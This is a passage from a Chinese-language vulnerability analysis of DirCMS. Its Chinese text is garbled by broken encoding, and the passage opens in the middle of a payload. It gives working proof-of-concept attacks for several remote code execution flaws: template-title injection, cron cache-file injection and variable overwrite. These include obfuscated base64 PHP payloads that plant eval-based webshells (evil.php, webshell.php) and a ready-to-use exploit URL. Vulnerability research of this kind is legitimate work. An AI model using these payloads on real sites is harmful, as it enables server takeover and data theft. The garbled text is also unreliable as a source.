file_put_contents("php://filter/write=convert.base64-decode/resource=evil.php","PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs/Pg=="); poc å¦‚ä¸‹ï¼š [ç¬¬{page}é¡µ{join}][{keyword}{join}][{param}{join}]{modulename}{join}{SITE_NAME}{file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs/Pg==)} å‰å°ä»£ç æ‰§è¡Œï¼ˆæ¨¡æ¿è§£æå¯¼è‡´ RCEï¼‰ è¿™ä¸ªå‰å°çš„ RCE ä¸ä¸Šé¢çš„åå° RCE sink ç‚¹ä¸€è‡´ï¼Œéƒ½æ˜¯åˆ©ç”¨ php55_replace_function å‡½æ•°ã€‚ æœç´¢ php55_replace_function çš„è°ƒç”¨ç‚¹ï¼Œä¸»è¦å‡ºç°åœ¨ dircms/Fcms/Library/Seo.php å’Œ dircms/Fcms/Library/Router.php ä¸¤ä¸ªæ–‡ä»¶ä¸­ã€‚ Seo ç±»ä¸­çš„ä¸‰ä¸ªå‡½æ•°éƒ½æœ‰è°ƒç”¨ï¼š dircms/Fcms/Library/Seo.php - Seo ç±» - category å‡½æ•° - search å‡½æ•° - show å‡½æ•° å…¶ä¸­ï¼Œsearch å‡½æ•°ç”¨äºå‰ç«¯æŸ¥è¯¢çª—å£ï¼Œä¸Šé¢çš„åå° RCE å°±æ˜¯éœ€è¦é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥è§¦å‘ï¼Œä½†æ­¤å¤„çš„ payload éœ€è¦ä¾èµ–åå°æ•°æ®ä¿®æ”¹ã€‚ show å‡½æ•°ç”¨äºæ–‡ç« çš„å±•ç¤ºï¼ŒæŸ¥çœ‹æŸä¸€ç¯‡æ–‡ç« æ—¶å°±ä¼šè°ƒç”¨ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š function show($mod, $data, $page = 1) { ... $meta_title = $mod['site'][SITE_ID]['show_title'] ? $mod['site'][SITE_ID]['show_title'] : '['.dr_lang('ç¬¬%sé¡µ', '{page}').'{join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME}'; $meta_title = $page &gt; 1 ? str_replace(array('[', ']'), '', $meta_title) : preg_replace('/\[.+\]/U', '', $meta_title); $rep = new \php5replace($data); $seo['meta_title'] = preg_replace_callback('#{([A-Z_]+)}#U', array($rep, 'php55_replace_var'), $meta_title); $seo['meta_title'] = preg_replace_callback('#{([a-z_0-9]+)}#U', array($rep, 'php55_replace_data'), $seo['meta_title']); $seo['meta_title'] = preg_replace_callback('#{([a-z_0-9]+)\((.*)\)}#Ui', array($rep, 'php55_replace_function'), $seo['meta_title']); $seo['meta_title'] = str_replace($data['join'].$data['join'], $data['join'], $seo['meta_title']); $seo['meta_title'] = htmlspecialchars(dr_clearhtml($seo['meta_title'])); ... } å¯ä»¥çœ‹åˆ°å…¶ä¸­ç”¨åˆ°äº† {join}]{title}{join}{catpname}{join}{modulename}{join}{SITE_NAME} è¿™ä¸ªæ¨¡æ¿ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç»è¿‡ php55_replace_data å‡½æ•°æ—¶ï¼Œå°±ä¼šä½¿ç”¨æ–‡ç« å®é™…çš„æ ‡é¢˜æ¥æ›¿æ¢ {title}ã€‚ ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™æ®µä»£ç è°ƒç”¨å®Œ php55_replace_data ä¹‹åï¼Œç»§ç»­è°ƒç”¨ php55_replace_functionï¼Œå¦‚æœæˆ‘ä»¬å°† title å¡«å……ä¸º {file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,base64_content)}ï¼Œå°±å¯ä»¥è¿›å…¥ php55_replace_function çš„è°ƒç”¨ã€‚ å› æ­¤ï¼Œåªéœ€è¦åˆ›å»ºä¸€ç¯‡æ–‡ç« ï¼Œå°†æ ‡é¢˜å¡«å……ä¸ºä¸Šè¿°çš„ payload å³å¯ï¼Œå¦‚æœç«™ç‚¹å¼€å¯äº†æ³¨å†Œï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œç„¶ååˆ›å»ºä¸€ç¯‡æ–‡ç« å°±å¯ä»¥ RCEã€‚ poc: {file_put_contents(php://filter/write=convert.base64-decode/resource=evil.php,PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==)} åˆ›å»ºå®Œä¹‹ååœ¨å‰å°æŸ¥çœ‹è¯¥æ–‡ç« å°±å¯ä»¥è§¦å‘ã€‚ åå°ä»£ç æ³¨å…¥ï¼ˆç¼“å­˜æ–‡ä»¶åˆ©ç”¨ï¼‰ å‚è€ƒè¿™ç¯‡æ–‡ç«  æŸCMSæ¼æ´æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒºï¼Œè¯¥æ¼æ´å‡ºç°åœ¨è¿…ç¿ CMS æ¡†æ¶ç‰ˆæœ¬ v4.3.3ï½v4.5.0ï¼ŒDirCMS ä¸­æ²¡æœ‰æ˜ç¡®æ ‡è¯†ç‰ˆæœ¬ï¼Œä½†æ ¹æ®ä»£ç é€»è¾‘åˆ¤æ–­å±äºè¯¥ç‰ˆæœ¬åŒºé—´ã€‚ dircms/Core/Controllers/Admin/Cron.php ä¸­çš„ add å‡½æ•°ä¼šå°†ç”¨æˆ·è¾“å…¥å†™å…¥ç¼“å­˜æ–‡ä»¶ï¼Œå¹¶ä¸”æ¯æ¬¡è®¿é—®æ—¶å¯¹ç¼“å­˜æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œç”±æ­¤é€ æˆä»£ç æ³¨å…¥ï¼Œadd å‡½æ•°çš„ä»£ç å¦‚ä¸‹ï¼š public function add() { $json = ''; if (is_file(WRITEPATH.'config/cron.php')) { require WRITEPATH.'config/cron.php'; } $data = json_decode($json, true); if (IS_AJAX_POST) { $post = \Phpcmf\Service::L('input')-&gt;post('data', true); file_put_contents(WRITEPATH.'config/cron.php', '&lt;?php defined(\'FCPATH\') OR exit(\'No direct script access allowed\');'.PHP_EOL.' $json=\''.json_encode($post).'\';'); \Phpcmf\Service::L('input')-&gt;system_log('è®¾ç½®è‡ªå®šä¹‰ä»»åŠ¡ç±»å‹'); $this-&gt;_json(1, dr_lang('æ“ä½œæˆåŠŸ')); } \Phpcmf\Service::V()-&gt;assign([ 'data' =&gt; $data, ]); \Phpcmf\Service::V()-&gt;display('cron_add.html'); } è§¦å‘ add å‡½æ•°çš„è°ƒç”¨éœ€è¦è¿›å…¥ç®¡ç†å‘˜åå° -&gt; åº”ç”¨ -&gt; åº”ç”¨æ’ä»¶ -&gt; ä»»åŠ¡é˜Ÿåˆ—ã€‚ ç‚¹å‡»ä¿å­˜å¯ä»¥æäº¤ post æŠ¥æ–‡ï¼Œdata å‚æ•°ç»è¿‡ json_encode æœ€ç»ˆä¼šå†™å…¥ cache/config/cron.php ';file_put_contents(implode(base64_decode('Lw=='),['php:','','filter','write=convert.base64-decode','resource=evil.php']),'PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==');return;$a=' æœ€ç»ˆå†™å…¥ cache/config/cron.php æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š &lt;?php defined('FCPATH') OR exit('No direct script access allowed'); $json='{"1":{"name":"';file_put_contents(implode(base64_decode('Lw=='),['php:','','filter','write=convert.base64-decode','resource=evil.php']),'PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Cg==');return;$a='"}}'; ä¹Ÿå‚è€ƒè¿™ç¯‡æ–‡ç«  æŸCMSæ¼æ´æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº ä¸­çš„ poc: isform=1&amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f&amp;data[1][name]=&amp;data[1][code]=[';file_put_contents('webshell.php',htmlspecialchars_decode('&lt;').'?php eval'.base64_decode('KA==').'@$_POST['.base64_decode('Ig==').'password'.base64_decode('Ig==').']'.base64_decode('KQ==').';?'.htmlspecialchars_decode('&gt;'));return;'] å‰å°ä»£ç æ‰§è¡Œï¼ˆå˜é‡è¦†ç›–å¯¼è‡´æ¨¡æ¿å˜é‡å¯æ§ï¼‰ dircms/Fcms/Core/View.php ä¸­çš„ list_tag å‡½æ•°ä¸­å­˜åœ¨è¿™æ ·çš„ä»£ç ï¼š // list æ ‡ç­¾è§£æ public function list_tag($_params) { ... switch ($system['action']) { case 'function': //æ‰§è¡Œå‡½æ•° if (!isset($param['name'])) { return $this-&gt;_return($system['return'], 'nameå‚æ•°ä¸å­˜åœ¨'); } elseif (!function_exists($param['name'])) { return $this-&gt;_return($system['return'], 'å‡½æ•°['.$param['name'].']æœªå®šä¹‰'); } $name = 'function-'.md5(dr_array2string($param)); $cache = \Phpcmf\Service::L('cache')-&gt;init()-&gt;get($name); if (!$cache) { $rt = call_user_func($param['name'], $param['param']); $cache = [ $rt ]; \Phpcmf\Service::L('cache')-&gt;init()-&gt;save($name, $cache, $system['cache']); } return $this-&gt;_return($system['return'], $cache, ''); break; å½“ action ä¸ºå­—ç¬¦ä¸² function æ—¶ï¼Œä¼šè°ƒç”¨ call_user_func($param['name'], $param['param']) æ‰§è¡Œå‡½æ•°ã€‚å¦‚æœå‡½æ•°åä¸å‡½æ•°å‚æ•°å¯æ§ï¼Œåˆ™å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚ list_tag å‡½æ•°åœ¨å¤§é‡çš„æ¨¡æ¿æ–‡ä»¶ä¸­è¢«è°ƒç”¨ï¼Œä¾‹å¦‚ï¼šcache/template/template_pc_default_home_api_list_data.html.cache.phpã€‚è¯¥æ–‡ä»¶æ˜¯ template/pc/default/home/api/list_data.html ç»è¿‡è§£æä¹‹åç”Ÿæˆçš„ php ç¼“å­˜æ–‡ä»¶ã€‚ å½“éœ€è¦ä½¿ç”¨ list_data.html è¿™ä¸ªå‰ç«¯æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå°† cache/template/template_pc_default_home_api_list_data.html.cache.php è¿™ä¸ªç¼“å­˜æ–‡ä»¶åŒ…å«è¿›æ¥ã€‚ è¯¥ç¼“å­˜æ–‡ä»¶çš„éƒ¨åˆ†å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š &lt;?php $list_return = $this-&gt;list_tag("action=module module=news catid=$catid page=1 cache=300"); if ($list_return) extract($list_return, EXTR_OVERWRITE); $count=dr_count($return); if (is_array($return)) { foreach ($return as $key=&gt;$t) { $is_first=$key==0 ? 1 : 0;$is_last=$count==$key+1 ? 1 : 0; ?&gt; &lt;div class="ajax-load-con content excerpt-one"&gt; &lt;div class="content-box posts-image-box"&gt; &lt;div class="posts-default-title"&gt; &lt;div class="post-entry-categories"&gt; å…¶ä¸­ä¼šè°ƒç”¨ list_tag å‡½æ•°ï¼Œä¸”ä¼ å…¥å‚æ•° action=module module=news catid=$catid page=1 cache=300ã€‚å¯ä»¥çœ‹åˆ°å‚æ•°æ˜¯é€šè¿‡ç©ºæ ¼è¿›è¡Œåˆ†å‰²çš„é”®å€¼å¯¹ï¼Œlist_tag å‡½æ•°åœ¨è¿›è¡Œå¤„ç†æ—¶ï¼Œä¼šå°†é”®å€¼å¯¹ä¿å­˜åœ¨ $system è¿™ä¸ªå˜é‡ä¸­ï¼š foreach ($params as $t) { ... if (isset($system[$var])) { // ç³»ç»Ÿå‚æ•°ï¼Œåªèƒ½å‡ºç°ä¸€æ¬¡ï¼Œä¸èƒ½æ·»åŠ ä¿®é¥°ç¬¦ $system[$var] = dr_safe_replace($val); } ä¾‹å¦‚ç¬¬ä¸€ä¸ªå‚æ•° actionï¼š $system['action'] = dr_safe_replace('module') æƒ³è¦è¿›å…¥ call_user_funcï¼Œå°±éœ€è¦ action çš„å€¼ä¸º functionã€‚ä½†åœ¨å†…ç½®çš„æ‰€æœ‰æ¨¡æ¿ä¸­ï¼Œæ²¡æœ‰æ¨¡æ¿ä½¿ç”¨åˆ°äº† action=functionã€‚ ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œlist_tag åœ¨è°ƒç”¨æ—¶ $this-&gt;list_tag("action=module module=news catid=$catid page=1 cache=300");ï¼Œä½¿ç”¨åˆ°äº†ä¸€ä¸ª $catid å˜é‡ã€‚ç”±äºè¿™ä¸ªå˜é‡è¢«ç›´æ¥æ‹¼æ¥è¿›æ¥ï¼Œå‡å¦‚æ„é€  $catid = " action=function name=phpinfo param0=-1" æœ€ç»ˆä¼ å…¥ list_tag çš„å‚æ•°å°±ä¼šå˜æˆï¼š $this-&gt;list_tag("action=module module=news catid= action=function name=phpinfo param0=-1 page=1 cache=300"); action å‚æ•°è¢«è®¾ç½®äº†ä¸¤æ¬¡ï¼Œä½†æœ€ç»ˆä¼šéƒ½è¢«è®¾ç½®ä¸ºåè€…çš„å€¼ï¼Œè¿™æ ·ä¹Ÿå°±è¾¾åˆ°äº†ç›®çš„ã€‚ $catid åœ¨å“ªè¢«èµ‹å€¼å‘¢ï¼Ÿæ¨¡æ¿æ–‡ä»¶å®é™…ä¸Šæ˜¯åœ¨ dircms/Fcms/Core/View.php ä¸­çš„ display å‡½æ•°ä¸­ä½¿ç”¨ include åŒ…å«è¿›æ¥çš„ï¼Œåœ¨è¿™ä¸ª include çš„å‰æ–¹ï¼Œæ­£å¥½è°ƒç”¨äº†ä¸€æ¬¡ extract å‡½æ•°ã€‚ public function display($_name, $_dir = '') { if (!isset($this-&gt;_options['get'])) { $this-&gt;_options['get'] = \Phpcmf\Service::L('input')-&gt;xss_clean($_GET); } ... extract($this-&gt;_options, EXTR_PREFIX_SAME, 'data'); ... include $this-&gt;load_view_file($_view_file); ... } extract å‡½æ•°å¯ä»¥é€ æˆå˜é‡è¦†ç›–ï¼Œå¦‚æœ $this-&gt;_optionså¯æ§çš„è¯ï¼Œå°±å¯ä»¥å¯¹ $catid èµ‹å€¼ã€‚å‘ä¸Šæº¯æºå¯ä»¥å‘ç°æ ¹å¤šåœ°æ–¹éƒ½æœ‰è°ƒç”¨ display å‡½æ•°ï¼Œä½†åªæœ‰ dircms/Core/Controllers/Api/Api.php ä¸­çš„ template å‡½æ•°æœ€æ–¹ä¾¿åˆ©ç”¨ï¼š public function template() { $file = dr_safe_filename(\Phpcmf\Service::L('input')-&gt;get('name')); $module = dr_safe_filename(\Phpcmf\Service::L('input')-&gt;get('module')); $data = [ 'file' =&gt; $file, 'module' =&gt; $module, ]; ... \Phpcmf\Service::V()-&gt;assign(\Phpcmf\Service::L('input')-&gt;get('', true)); ob_start(); \Phpcmf\Service::V()-&gt;display($file); $html = ob_get_contents(); ob_clean(); ... } ç›´æ¥è°ƒç”¨ \Phpcmf\Service::V()-&gt;assign å‡½æ•°å¹¶ä¼ å…¥æ‰€æœ‰ GET è¯·æ±‚å‚æ•°ã€‚\Phpcmf\Service::V()-&gt;assign å‡½æ•°å°±æ˜¯ç”¨äºç»™ option æˆå‘˜å˜é‡èµ‹å€¼çš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š public function assign($key, $value = '') { if (!$key) { return FALSE; } if (is_array($key)) { foreach ($key as $k =&gt; $v) { $this-&gt;_options[$k] = $v; } } else { $this-&gt;_options[$key] = $value; } } ç”±æ­¤ä¸€æ¥ä» GET è¯·æ±‚å‚æ•°ä¸­ä¼ å…¥å³å¯ã€‚poc å¦‚ä¸‹ï¼š /index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=list_data.html&amp;phpcmf_dir=admin&amp;catid=%20action=function%20name=phpinfo%20param0=-1 è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ€è·¯æ¥è‡ªäºæ–‡ç«  æŸcms å‰å°RCEæ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒºï¼Œé€šè¿‡å˜é‡è¦†ç›–æ§åˆ¶æ¨¡æ¿å˜é‡æ¥è¾¾æˆ RCEï¼Œä¸å¾—ä¸è¯´ååˆ†å·§å¦™ã€‚ æ€»ç»“ æ¨¡æ¿è§£æåŠŸèƒ½æ˜¯æé«˜ php CMS æ¡†æ¶çµæ´»æ€§çš„é‡è¦åŠŸèƒ½ï¼Œä½†åŒæ ·æ„å‘³ç€å®¹æ˜“å‡ºç°å¯åˆ©ç”¨çš„ç‚¹ï¼Œä¾‹å¦‚ï¼Œåå°ä¿®æ”¹æ¨¡æ¿ã€åˆ©ç”¨å˜é‡è¦†ç›–æ§åˆ¶æ§åˆ¶æ¨¡æ¿å˜é‡ç­‰åˆ©ç”¨æ–¹å¼ã€‚ ç¼“å­˜æ–‡ä»¶é€šå¸¸ä¼šåœ¨ç¨‹åºä¸­è¢«åŒ…å«è¿›æ¥ï¼Œä¸€æ—¦ç¼“å­˜æ–‡ä»¶çš„å†…å®¹å¯æ§ï¼Œå°±å¯èƒ½é€ æˆä¸¥é‡çš„å½±å“ã€‚ å‚è€ƒèµ„æ–™ æŸCMSæ¼æ´æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº æŸcms å‰å°RCEæ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº]]></summary></entry></feed>